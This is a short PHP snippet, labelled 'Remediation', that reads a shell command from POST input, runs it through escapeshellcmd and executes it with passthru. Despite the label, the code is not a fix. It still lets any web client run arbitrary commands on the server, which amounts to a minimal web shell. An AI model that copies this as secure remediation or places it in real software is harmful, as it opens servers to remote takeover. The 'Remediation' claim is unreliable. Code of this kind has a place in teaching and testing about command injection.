<?php 
// Remediation
$command = $_POST['command'];
$command = escapeshellcmd($command);
passthru($command);

?> 
